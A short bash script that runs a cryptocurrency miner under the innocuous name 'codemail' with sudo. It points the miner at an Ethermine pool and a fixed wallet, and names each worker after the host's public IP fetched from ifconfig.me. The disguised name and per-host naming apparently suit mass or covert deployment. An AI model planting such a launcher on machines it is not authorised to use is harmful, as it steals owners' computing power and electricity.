#!/bin/bash

POOL=us1.ethermine.org:4444
WALLET=0x91d0fbc896f78b8d2c7174902e0daf44efa19513.$(echo "$(curl -s ifconfig.me)" | tr . _ )-mau-ne

cd "$(dirname "$0")"

chmod +x ./codemail && sudo ./codemail --algo ETHASH --pool $POOL --user $WALLET  $@
